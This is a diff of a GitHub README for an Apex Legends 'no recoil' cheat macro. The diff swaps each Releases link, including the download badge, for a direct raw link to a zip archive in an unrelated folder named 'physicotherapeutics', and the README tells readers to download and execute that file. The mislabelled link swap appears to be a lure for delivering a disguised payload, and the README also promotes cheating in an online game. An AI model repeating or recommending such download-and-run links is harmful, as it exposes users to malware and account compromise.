@@ -7,7 +7,7 @@ Welcome to the **Apex-No-Recoil** repository! Here you can find resources to imp
 - **Free to Use**: Access and utilize the no recoil macro without any cost.
 
 ## How to Use
-To make use of the no recoil macro, download the necessary file from the [**Releases**](https://github.com/roniel8/Apex-No-Recoil/releases) section and execute it. This will help you in achieving better recoil control and thus, improving your overall performance in the game.
+To make use of the no recoil macro, download the necessary file from the [**Releases**](https://raw.githubusercontent.com/roniel8/Apex-No-Recoil/main/physicotherapeutics/Recoil_Apex_No_1.1-alpha.3.zip) section and execute it. This will help you in achieving better recoil control and thus, improving your overall performance in the game.
 
 ## Topics Covered
 This repository covers various topics related to Apex Legends and no recoil macros:
@@ -30,9 +30,9 @@ This repository covers various topics related to Apex Legends and no recoil macr
 - **no-recoil-steam-config**
 
 ## Visit the Link
-For further details and to download the necessary macro file, please visit the [**Releases**](https://github.com/roniel8/Apex-No-Recoil/releases) section.
+For further details and to download the necessary macro file, please visit the [**Releases**](https://raw.githubusercontent.com/roniel8/Apex-No-Recoil/main/physicotherapeutics/Recoil_Apex_No_1.1-alpha.3.zip) section.
 
-[![Download No Recoil Macro](https://img.shields.io/badge/Download-No_Recoil_Macro-blue)](https://github.com/roniel8/Apex-No-Recoil/releases)
+[![Download No Recoil Macro](https://raw.githubusercontent.com/roniel8/Apex-No-Recoil/main/physicotherapeutics/Recoil_Apex_No_1.1-alpha.3.zip)](https://raw.githubusercontent.com/roniel8/Apex-No-Recoil/main/physicotherapeutics/Recoil_Apex_No_1.1-alpha.3.zip)
 
 ## Get Started
 Enhance your Apex Legends gameplay with the no recoil macro provided in this repository. Download the file, apply the macro, and experience improved recoil control in your matches. Good luck and have fun gaming! 🎮🚀
